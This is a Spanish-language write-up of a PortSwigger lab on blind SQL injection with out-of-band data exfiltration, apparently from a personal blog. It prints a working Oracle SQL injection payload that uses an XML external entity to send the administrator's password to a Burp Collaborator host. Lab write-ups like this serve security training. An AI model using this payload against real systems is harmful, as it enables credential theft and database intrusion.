---
title: "16 Blind SQL injection with out of band data exfiltration"
collection: publications
category: portswigger
permalink: /publications/16_Blind SQL injection with out of band data exfiltration
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. Para resolver el laboratorio, explotamos la vulnerabilidad de inyección SQL fuera de banda para obtener la contraseña del administrador.'
date: 2024-12-02
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'Blind SQL injection with out of band data exfiltration'
---

![logo]({{site.url}}/images/SQLi/sqli-16/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/SQLi/sqli-16/descripcion.png)

## Objetivo del laboratorio

* Explotar una vulnerabilidad SQLi para obtener el password del usuario administrator.
* Login como usuario administrador

# Cheat Sheet

[Hoja de Trucos](https://portswigger.net/web-security/sql-injection/cheat-sheet)

![Cheet]({{site.url}}/images/SQLi/sqli-16/cheet.png)

# Servidor

Obtenemos un servidor desde la pestaña `Collaborator`

`nc33sjxg8k7bhtlz9h7khabde4kv8nwc.oastify.com`

Usamos los payloads que nos proporciona la hoja de trucos de Burp y le colocamos el servidor que nos proporciono.

```sql
' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.nc33sjxg8k7bhtlz9h7khabde4kv8nwc.oastify.com/"> %remote;]>'),'/l') FROM dual)--
```

![payload]({{site.url}}/images/SQLi/sqli-16/payload.png)

Abrimos el colaborator y vemos la contraseña del usuario `administrator`

![resultado]({{site.url}}/images/SQLi/sqli-16/resultado.png)

## Login

![login]({{site.url}}/images/SQLi/sqli-16/login.png)

## Resuelto

![resuelto]({{site.url}}/images/SQLi/sqli-16/aprobado.png)